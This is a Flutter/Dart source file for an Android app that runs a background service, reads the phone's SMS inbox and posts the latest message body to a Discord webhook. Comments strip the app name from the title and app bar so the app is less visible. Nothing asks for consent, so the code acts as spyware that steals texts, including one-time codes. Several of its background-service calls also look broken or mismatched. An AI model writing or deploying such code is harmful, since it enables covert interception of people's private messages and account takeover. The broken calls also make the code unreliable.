import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:telephony/telephony.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      // Remove the app name by setting the title to an empty string
      title: '',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: SMSReaderApp(),
    );
  }
}

class SMSReaderApp extends StatefulWidget {
  @override
  _SMSReaderAppState createState() => _SMSReaderAppState();
}

class _SMSReaderAppState extends State<SMSReaderApp> {
  final Telephony telephony = Telephony.instance;
  String lastReceivedMessage = "";

  @override
  void initState() {
    super.initState();
    // Initialize the background service
    FlutterBackgroundService.initialize(
      androidConfig: AndroidConfig(
        notificationTitle: 'Background Service',
        notificationText: 'Running in the background',
      ),
    );

    // Start the background service
    _startBackgroundTask();
  }

  Future<void> _startBackgroundTask() async {
    if (!(await FlutterBackgroundService().isServiceRunning)) {
      FlutterBackgroundService().sendData({
        "action": "startService",
        "callbackDispatcher": _callbackDispatcher,
      });
    }
  }

  void _callbackDispatcher() {
    FlutterBackgroundService().executeTask((task) {
      // Your background task code goes here
      _getLatestSMSAndSendToDiscord();
      // Periodically call task.finish() to keep the service alive
      task.finish();
    });
  }

  Future<void> _getLatestSMSAndSendToDiscord() async {
    List<SmsMessage> messages = await telephony.getInboxSms();
    if (messages.isNotEmpty) {
      final lastMessage = messages.last;
      final discordWebhookURL = 'YOUR_DISCORD_WEBHOOK_URL';

      final response = await http.post(
        Uri.parse(discordWebhookURL),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'content': lastMessage.body}),
      );

      if (response.statusCode == 200) {
        print('Message sent to Discord: ${lastMessage.body}');
      } else {
        print('Failed to send message to Discord. Status code: ${response.statusCode}');
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(''), // Remove the app name from the app bar
      ),
      body: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Text(
            'Last Received Message: $lastReceivedMessage',
            style: TextStyle(fontSize: 18),
          ),
        ],
      ),
    );
  }
}
